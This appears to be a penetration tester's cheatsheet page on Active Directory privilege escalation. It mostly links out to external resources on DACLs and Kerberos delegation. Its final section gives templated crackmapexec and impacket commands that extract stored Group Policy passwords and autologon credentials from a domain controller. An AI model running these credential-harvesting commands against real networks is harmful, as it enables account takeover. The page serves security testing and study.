---
layout: post
title: pen / ad / privesc
category: pen
parent: cheatsheets
modified_date: 2023-07-04
permalink: /pen/ad/privesc
---

**Mitre Att&ck Entreprise**: [TA0007 - Discovery](https://attack.mitre.org/tactics/TA0007/)

**Menu**
<!-- vscode-markdown-toc -->
* [dacl](#dacl)
* [kerberos](#kerberos)
	* [delegation](#delegation)
* [vuln_user_accounts_dormant](#vuln_user_accounts_dormant)
* [shoot-gpo](#shoot-gpo)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='dacl'></a>dacl

credit: [thehacker.repices](https://thehacker.repices/ad/movement/dacl)
![ad privesc DACLs](/assets/images/pen-privesc-dacl.png)

## <a name='kerberos'></a>kerberos

### <a name='delegation'></a>delegations

<iframe width="560" height="315" src="https://www.youtube.com/embed/7_iv_eaAFyQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

 [recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations) / [slides](https://drive.google.com/file/d/1S8Ee29xUHluaT3shvtuHZqGfwZGfSCaV/view)


## <a name='vuln_user_accounts_dormant'></a>vuln_user_accounts_dormant

* Queries:
```powershell

pwdLastSet
```
* [Description](https://www.cert.ssi.gouv.fr/uploads/ad_checklist.html#vuln_user_accounts_dormant)


## <a name='shoot-gpo'></a>shoot-gpo
```bash
# cme
crackmapexec smb $zdom_dc_ip -u $ztarg_user_name -p $ztarg_user_pass -M gpp_pasword
crackmapexec smb $zdom_dc_ip -u $ztarg_user_name -p $ztarg_user_pass -M gpp_autologin
# impacket
Get-GPPPassword.py $zz
```